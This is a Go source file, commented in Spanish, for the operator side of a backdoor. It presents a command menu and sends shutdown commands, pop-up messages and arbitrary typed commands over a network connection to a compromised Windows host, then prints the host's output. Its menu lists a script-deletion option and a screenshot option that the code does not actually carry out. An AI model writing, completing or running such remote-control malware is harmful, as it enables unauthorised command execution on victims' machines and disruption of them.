// modulo que prepara los comandos a enviar al backdoor
package remoto

import (
	color "comando/colores"
	"comando/input"
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

const INSTRUCCION = `
//comandos basicos:
//[0] borrar script          
//[1] apagar equipo
//[2] enviar mensaje
//[q] salir
//[ss] capturar pantalla
`

// funcion que abstrae el envio de paquetes al host
func envio(conexiones net.Conn, envio string) {

	err_t := conexiones.SetDeadline(time.Now().Add(time.Second * 3))
	if err_t != nil {
		fmt.Println("tiempo agotado")
	}

	buffer := make([]byte, 20000)

	_, error := conexiones.Write([]byte(envio))
	if error != nil {
		fmt.Println("hubo un problema: ", error)

	} else {
		// retornar los datos
		num, error := conexiones.Read(buffer)
		if error != nil {
			fmt.Println("[!] error al recibir la informacion")
		} else {
			fmt.Println(string(buffer[:num]))
		}

	}

}

// funcion cuyo proposito es la ejecucion de comandos
func Comando(conexiones net.Conn) {

	for {

		println(color.Violeta + INSTRUCCION + color.Reset)
		entrada := input.Input("[#] comando >> ")
		switch entrada {
		case "0":
			comando := exec.Command("powershell", "-command", "clear")
			error := comando.Run()
			if error != nil {
				fmt.Println("[!] error al ejecutar comando: ", error)
			}

		case "1":
			envio(conexiones, "shutdown /s ")
		case "2": // automatizacion de msg para ciertas ediciones de windows

			mensaje := input.Input("mensaje >> ")
			msg_format := fmt.Sprintf("msg * %s", mensaje)
			envio(conexiones, msg_format)
			continue

		case "q":
			fmt.Println(color.Verde + "\n[!] saliendo...\n" + color.Reset)
			conexiones.Close()
			os.Exit(0)

		default:
			envio(conexiones, entrada)
			continue

		}
	}
}
